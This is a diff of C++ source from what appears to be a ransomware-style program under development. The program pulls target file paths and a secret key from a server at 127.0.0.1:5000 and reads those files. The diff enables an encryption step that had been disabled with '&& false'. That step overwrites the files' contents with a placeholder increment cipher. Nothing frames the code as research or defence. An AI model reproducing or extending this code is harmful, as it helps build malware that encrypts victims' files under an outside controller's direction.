@@ -9,7 +9,7 @@
 
 int main(){  
 	std::vector<std::string> fileLocationsVector;
-	std::vector<std::vector<std::string>> fileContentVector;
+	//std::vector<std::vector<std::string>> fileContentVector;
 	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));
 	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
     std::vector<std::string> locationsToBeEncrypted;
@@ -30,37 +30,22 @@ int main(){
 
 	
 
-    // todo v
-    
-    std::vector<std::vector<std::string>> fileContentVector2;
-
-    for(auto& location : serverLocationsVector){
-			
-			std::vector<std::string> temporaryVector2;
-			if(getFileContents(location, temporaryVector2)){	   // Read contents of location.
-				fileContentVector2.push_back(temporaryVector2);  // Pushes each line into a string vector.
-				temporaryVector2.clear();		
-			}			
-		}
-
-    // todo ^
-      	
 
     
-    //Reads content of each location and pushes it into a string vector which gets pushed into a vector<string::vector>.
-	if(success){ 		
-		for(std::string& location : locationsToBeEncrypted){
-			
-			std::vector<std::string> temporaryVector;
-			if(getFileContents(location, temporaryVector)){	   // Read contents of location.
-				fileContentVector.push_back(temporaryVector);  // Pushes each line into a string vector.
-				temporaryVector.clear();		
-			}			
-		}
-    }  
+    
+    std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector);
+
+    std::vector<std::vector<std::string>> fileContentVector3 = fileContentRetreiver(fileLocationsVector);
+
+    std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // ?
 
 
-    if(locationsToBeEncrypted.size() > 0 && false){
+ 
+    
+    
+	
+
+    if(locationsToBeEncrypted.size() > 0){
 	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
 		for(auto& file: fileContentVector){
 			for(auto& line : file){
